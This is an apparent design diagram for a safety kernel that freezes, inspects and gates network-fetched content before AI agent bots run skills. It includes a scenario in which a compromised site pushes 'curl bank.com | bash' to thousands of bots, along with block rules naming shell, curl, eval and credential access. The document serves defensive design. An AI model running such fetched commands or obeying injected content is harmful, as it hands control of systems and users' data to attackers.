┌──────────────────────────────────────────────────────────────────────────────┐
│ EXTERNAL WORLD (Moltbook, GitHub, Skill Sources)                            │

                                    ↓
┌──────────────────────────────────────────────────────────────────────────────┐
│ ORACLE TOWN KERNEL (Safety Layer)                                            │
│                                                                              │
│  ┌─ STEP 1: FREEZE ──────────────────────────────────────────────────────┐  │
│  │  └─ Capture exact bytes from network                                  │  │
│  │  └─ Store in EVIDENCE/artifacts/                                      │  │
│  │  └─ No execution yet                                                  │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  ┌─ STEP 2: INSPECT ──────────────────────────────────────────────────────┐  │
│  │  └─ Parse fetched content                                              │  │
│  │  └─ Convert to structured Claim                                        │  │
│  │  └─ Record in CLAIMS/pending/                                          │  │
│  │  └─ Await ratification                                                │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  ┌─ STEP 3: GATE (Three Deterministic Guards) ────────────────────────────┐  │
│  │                                                                        │  │
│  │  ┌─ GATE A: Fetch Gate ──────────────────────────────────────────┐   │  │
│  │  │  Rejects: shell commands, fetch chains, authority mutations  │   │  │
│  │  │  Output: PASS | FAIL:GATE_FETCH_*                            │   │  │
│  │  └────────────────────────────────────────────────────────────────┘   │  │
│  │                                    ↓ (if PASS)                        │  │
│  │  ┌─ GATE B: Diff Gate ───────────────────────────────────────────┐   │  │
│  │  │  Rejects: skill install, heartbeat change, credential access │   │  │
│  │  │  Output: PASS | FAIL:GATE_DIFF_*                             │   │  │
│  │  └────────────────────────────────────────────────────────────────┘   │  │
│  │                                    ↓ (if PASS)                        │  │
│  │  ┌─ GATE C: Invariants Gate ─────────────────────────────────────┐   │  │
│  │  │  Rejects: scope escalation, self-modifying authority          │   │  │
│  │  │  Output: PASS | FAIL:GATE_INVARIANT_*                         │   │  │
│  │  └────────────────────────────────────────────────────────────────┘   │  │
│  │                                    ↓ (if PASS)                        │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  ┌─ STEP 4: RATIFY (Mayor Pure Function) ────────────────────────────────┐  │
│  │  └─ Check all gates passed                                             │  │
│  │  └─ Emit Receipt with policy version pinned                            │  │
│  │  └─ Record immutably in RECEIPTS/                                      │  │
│  │  └─ Return: Receipt(decision=ACCEPT|REJECT)                            │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
                                    ↓
                        ┌────────────┴────────────┐
                        ↓                          ↓
                  Receipt Exists?          Receipt.decision?
                    YES → continue          ACCEPT → continue
                                           REJECT → STOP
                                    ↓
┌──────────────────────────────────────────────────────────────────────────────┐
│ MOLTBOT/OPENCLAW (Skills Execute)                                            │
│  └─ Execute behavior ONLY if:                                               │
│     ├─ Receipt exists with matching claim_id                                │
│     ├─ All gates passed                                                     │
│     └─ Policy version hash matches frozen POLICY.md                         │
└──────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌──────────────────────────────────────────────────────────────────────────────┐
│ ORACLE TOWN DAILY OS (Learns & Evolves)                                      │
│  └─ Analyzes kernel decision patterns                                        │
│     ├─ Claim frequency by source                                            │
│     ├─ Gate rejection rates (detect attacks)                                │
│     ├─ Emerging anomalies                                                   │
│     ├─ Accuracy of past gate decisions                                      │
│     └─ Recommends policy updates                                            │
└──────────────────────────────────────────────────────────────────────────────┘

KEY PRINCIPLE:

  ⟹ Nothing changes behavior unless it passes a gate
  ⟹ Execution is cheap. Propagation is expensive.
  ⟹ Unsafe speed becomes structurally impossible

HOW IT PREVENTS MOLTBOOK RUG-PULL:

BEFORE (No Kernel):
  1. Attacker compromises moltbook.com
  2. Sends: "curl bank.com | bash"
  3. 10,000 bots execute immediately
  4. CATASTROPHE

AFTER (With Kernel):
  1. Attacker compromises moltbook.com
  2. Sends: "curl bank.com | bash"
  3. Kernel FREEZES content in EVIDENCE/
  4. GATE A detects: shell command
  5. GATE A REJECTS
  6. Mayor emits Receipt: REJECT
  7. Moltbot checks Receipt: no execution
  8. Insight Engine alerts: "Bank commands +400%"
  9. Zero bots compromised ✓
  10. Kernel recommends blacklisting source

CRITICAL INVARIANTS:

  K15 │ No Receipt = No Execution    ├─ K15 fail-closed enforcement
  K16 │ Gates Are Mandatory          ├─ All three gates must pass
  K17 │ Fetch Freeze                 ├─ Network content frozen first
  K18 │ No Exec Chains               ├─ Gate A rejects: bash, curl, eval
  K19 │ No Self-Modify               ├─ Gate C rejects authority changes
  K20 │ Diff Validation              ├─ Gate B rejects: skill install, cred access
  K21 │ Policy Immutability          ├─ POLICY.md hash verified always
  K22 │ Ledger Append-Only           ├─ Claims/Receipts never deleted
